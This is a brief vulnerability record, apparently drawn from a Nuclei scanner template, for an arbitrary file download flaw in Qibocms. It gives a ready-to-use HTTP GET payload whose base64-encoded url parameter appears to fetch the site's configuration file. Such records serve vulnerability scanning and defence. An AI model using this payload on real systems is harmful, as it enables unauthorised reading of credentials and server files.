# Vulnerability: Qibocms - Arbitrary File Download
**Classification:** CWE-200,CWE-552
**Source:** Nuclei Template (`qibocms-file-download.yaml`)

## Description
Qibocms is vulnerable to arbitrary file download vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
```

